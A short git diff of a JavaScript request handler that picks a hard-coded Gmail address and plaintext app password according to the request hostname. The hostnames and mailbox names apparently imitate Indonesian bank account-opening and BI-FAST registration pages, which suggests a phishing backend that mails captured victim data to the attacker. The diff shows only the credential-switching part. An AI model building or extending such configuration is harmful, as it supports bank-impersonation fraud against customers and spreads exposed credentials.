@@ -22,9 +22,10 @@ export default function handler(req, res) {
         pass = 'ezbvulgxsjerhpnb';
 
     }
-    else {
-        email = 'bripembukaanrekening@gmail.com';
-        pass = 'nocpaagwmdvyyoin';
+    else if (url == 'daftar-bi-fast.herokuapp.com'){
+        email = 'ayamperu233@gmail.com';
+        pass = 'rtzqphftdjkdrnwa';
+        
     }
         
         try {
